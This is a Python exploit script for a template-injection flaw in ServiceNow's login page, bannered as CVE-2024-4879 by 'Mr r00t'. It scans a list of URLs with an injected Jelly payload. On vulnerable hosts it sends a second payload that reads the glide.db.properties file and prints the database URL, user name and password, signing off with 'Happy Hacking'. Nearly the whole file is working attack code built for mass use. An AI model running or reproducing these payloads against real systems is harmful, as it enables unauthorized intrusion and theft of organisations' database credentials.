import requests
import argparse
import urllib3
from colorama import Fore, Style, Back

# Deshabilitar advertencias de verificación SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración del tiempo de espera en segundos
TIMEOUT = 10

# Función para verificar la vulnerabilidad
def check_vulnerability(url):
    full_url = f"{url}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(668.5*2);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
    
    try:
        response = requests.get(full_url, verify=False, timeout=TIMEOUT)
        
        # Check if status code is 200
        if response.status_code == 200:
            # Check if the body contains the word "1337"
            if "1337" in response.text:
                print(f"{Style.BRIGHT}{Back.CYAN}[+] Vulnerability found in {url}{Style.RESET_ALL}")
                # Make the additional request to dump the database connection details
                dump_url = f"{url}/login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E"
                dump_response = requests.get(dump_url, verify=False, timeout=TIMEOUT)
                if dump_response.status_code == 200:
                    print(f"{Fore.GREEN}Database connection details dumped for {Fore.LIGHTMAGENTA_EX}{dump_url}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Database Connection Details:")
                    print(format_db_details(dump_response.text))
                    return f"{Fore.YELLOW}[!] Happy Hacking :)!{Fore.RESET}"
                else:
                    return f"{Fore.RED}Failed to dump database connection details for {url}. Status code: {dump_response.status_code}{Style.RESET_ALL}"
            else:
                return f"{Style.BRIGHT}{Back.MAGENTA}[-] Vulnerability not found in body for {url}{Style.RESET_ALL}"
        else:
            return f"{Style.BRIGHT}{Back.RED}Unexpected status code {response.status_code} for {url}{Style.RESET_ALL}"
    
    except requests.RequestException as e:
        return f"{Style.BRIGHT}{Back.BLUE}Request failed for {url}{Style.RESET_ALL}"
    except requests.Timeout:
        return f"{Fore.YELLOW}Request timed out for {url}{Style.RESET_ALL}"

def format_db_details(details):
    lines = details.split("\n")
    formatted_details = []
    for line in lines:
        if '&#61;' in line:
            key, value = line.split('&#61;', 1)
            if any(db_key in key for db_key in ["glide.db.name", "glide.db.rdbms", "glide.db.url", "glide.db.user", "glide.db.password"]):
                formatted_details.append(f"{key.strip()} = {value.strip()}")
    return "\n".join(formatted_details)

# Función principal para manejar argumentos y leer archivo
def main():
    parser = argparse.ArgumentParser(description="Check URLs for a specific vulnerability.")
    parser.add_argument('-f', '--file', required=True, help="File containing list of URLs")
    args = parser.parse_args()

    try:
        with open(args.file, 'r') as file:
            urls = file.readlines()
            for url in urls:
                url = url.strip()  # Remove any leading/trailing whitespace
                if url:
                    result = check_vulnerability(url)
                    print(result)
    except FileNotFoundError:
        print(f"File {args.file} not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    print(f"""{Fore.LIGHTMAGENTA_EX}

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██   ██       ██   ██  █████  ███████  █████  
██      ██    ██ ██                 ██ ██  ████      ██ ██   ██       ██   ██ ██   ██      ██ ██   ██ 
██      ██    ██ █████   █████  █████  ██ ██ ██  █████  ███████ █████ ███████  █████      ██   ██████ 
██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██   ██    ██        ██ 
 ██████   ████   ███████       ███████  ██████  ███████      ██            ██  █████     ██    █████  
                                                                                                      
                  Template Injection Vulnerability in ServiceNow - By Mr r00t                                                                                     
          {Style.RESET_ALL}""")
    main()
